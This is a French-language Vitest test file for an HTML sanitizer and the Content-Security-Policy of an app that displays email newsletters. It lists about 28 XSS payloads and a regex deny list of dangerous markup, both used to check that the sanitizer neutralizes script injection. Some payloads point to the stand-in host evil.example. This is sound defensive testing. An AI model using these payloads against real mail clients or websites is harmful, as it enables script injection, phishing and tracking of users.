import { describe, expect, it } from "vitest";
import { sanitizeForReading } from "@/lib/outlook";
import { needsNewsletterCsp, newsletterCsp } from "@/lib/csp";

/** Charges classiques d'injection de script dans un e-mail. */
const PAYLOADS = [
  `<script>window.pwned=1</script>`,
  `<img src="x" onerror="window.pwned=1">`,
  `<img src=x onerror=alert(1)//>`,
  `<a href="javascript:alert(1)">clic</a>`,
  `<a href="JaVaScRiPt:alert(1)">clic</a>`,
  `<a href="&#106;avascript:alert(1)">clic</a>`,
  `<a href="data:text/html,<script>alert(1)</script>">clic</a>`,
  `<a href="vbscript:msgbox(1)">clic</a>`,
  `<svg onload="alert(1)"><circle r="1"/></svg>`,
  `<svg><script>alert(1)</script></svg>`,
  `<math><mtext><script>alert(1)</script></mtext></math>`,
  `<iframe src="https://evil.example"></iframe>`,
  `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  `<object data="https://evil.example/x.swf"></object>`,
  `<embed src="https://evil.example/x.swf">`,
  `<form action="https://evil.example"><input name="pw"><button>OK</button></form>`,
  `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
  `<link rel="stylesheet" href="https://evil.example/x.css">`,
  `<base href="https://evil.example/">`,
  `<style>body{display:none}</style><p style="position:fixed;inset:0;background:url(https://evil.example/t.gif)">x</p>`,
  `<div onclick="alert(1)" onmouseover="alert(1)">survol</div>`,
  `<p id="__next" name="getElementById" class="fixed inset-0">clobber</p>`,
  `<details open ontoggle="alert(1)"><summary>x</summary></details>`,
  `<video><source onerror="alert(1)"></video>`,
  `<template><script>alert(1)</script></template>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
  `<!--<img src="--><img src=x onerror=alert(1)//">-->`,
  `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`,
];

const DANGER = [/<script/i, /\son[a-z]+\s*=/i, /javascript:/i, /vbscript:/i, /data:text\/html/i, /<svg/i, /<math/i, /<iframe/i, /srcdoc/i,
  /<object/i, /<embed/i, /<form/i, /<input/i, /<meta/i, /<link/i, /<base/i, /<style/i, /\sstyle=/i, /\sclass=/i, /\sid=/i, /\sname=/i,
  /<details/i, /<video/i, /<source/i, /<template/i, /background=/i];

describe("mode Lecture : aucun script d'un e-mail ne peut passer", () => {
  for (const html of PAYLOADS) {
    it(`neutralise ${html.slice(0, 60)}`, () => {
      for (const images of [false, true]) {
        const out = sanitizeForReading(html, { images });
        for (const re of DANGER) expect(out, `${re} dans « ${out} »`).not.toMatch(re);
      }
    });
  }

  it("garde le texte, les liens sûrs (ouverts à part) et les tableaux", () => {
    const out = sanitizeForReading(`<h2 style="color:red">Titre</h2><p>Un <a href="https://ex.com/a">lien</a> et <b>gras</b>.</p><table><tr><td colspan="2">CAC 40</td></tr></table>`, { images: false });
    expect(out).toBe(`<h2>Titre</h2><p>Un <a href="https://ex.com/a" target="_blank" rel="noopener noreferrer nofollow">lien</a> et <b>gras</b>.</p><table><tr><td colspan="2">CAC 40</td></tr></table>`);
  });

  it("images : absentes par défaut ; si autorisées, seulement http(s), sans pixel de suivi", () => {
    const html = `<img src="https://ex.com/logo.png" alt="Logo" width="200"><img src="https://t.ex.com/p.gif" width="1" height="1"><img src="data:image/png;base64,AAAA"><img src="cid:abc">`;
    expect(sanitizeForReading(html, { images: false })).toBe("");
    expect(sanitizeForReading(html, { images: true })).toBe(`<img src="https://ex.com/logo.png" alt="Logo" width="200" /><img /><img />`);
  });
});

describe("CSP des pages de lecture (deuxième barrière)", () => {
  const csp = newsletterCsp("abc123", { images: false, dev: false });
  it("seuls les scripts portant le nonce de la page peuvent s'exécuter ; aucun attribut on…= ", () => {
    expect(csp).toContain("script-src 'nonce-abc123' 'strict-dynamic'");
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-eval'/);
    expect(csp).toContain("script-src-attr 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");
  });
  it("images distantes bloquées tant que « Images » n'est pas choisi", () => {
    expect(csp).toMatch(/img-src 'self' data: blob:;/);
    expect(newsletterCsp("n", { images: true, dev: false })).toMatch(/img-src 'self' data: blob: https: http:;/);
  });
  it("ne concerne que la lecture d'une newsletter", () => {
    expect(needsNewsletterCsp("/newsletters/AAMkAD123")).toBe(true);
    expect(needsNewsletterCsp("/newsletters")).toBe(false);
    expect(needsNewsletterCsp("/notions")).toBe(false);
  });
});
